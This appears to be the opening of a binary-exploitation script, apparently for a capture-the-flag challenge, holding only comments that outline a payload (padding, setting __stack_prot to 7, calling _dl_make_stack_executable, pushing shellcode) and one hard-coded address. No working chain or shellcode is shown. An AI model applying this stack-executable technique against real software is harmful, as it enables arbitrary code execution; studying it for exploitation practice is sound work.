# Payload:
# padding
# set __stack_prot to 7
# set RDI to __libc_stack_end
# execute _dl_make_stack_executable
# push shellcode

stack_prot = 0x6b8ef0
